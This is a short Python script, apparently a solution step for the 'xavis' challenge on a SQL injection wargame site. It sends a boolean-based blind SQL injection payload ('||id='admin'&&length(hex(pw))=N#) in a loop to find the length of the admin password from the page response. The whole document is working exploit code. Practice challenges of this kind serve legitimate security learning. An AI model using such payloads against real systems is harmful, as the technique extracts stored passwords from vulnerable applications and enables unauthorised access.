import requests
url = 'https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php'
cookie = {'PHPSESSID' : COOKIE}

for i in range(1, 30):
    req_url = url + f"?pw= '||id='admin'%26%26length(hex(pw))={i}%23"
    res = requests.get(req_url, cookies=cookie)
    if "<h2>Hello admin</h2>" in res.text:
        print(f"{i} -> O")
        break
    else:
        print(f"{i} ---> X")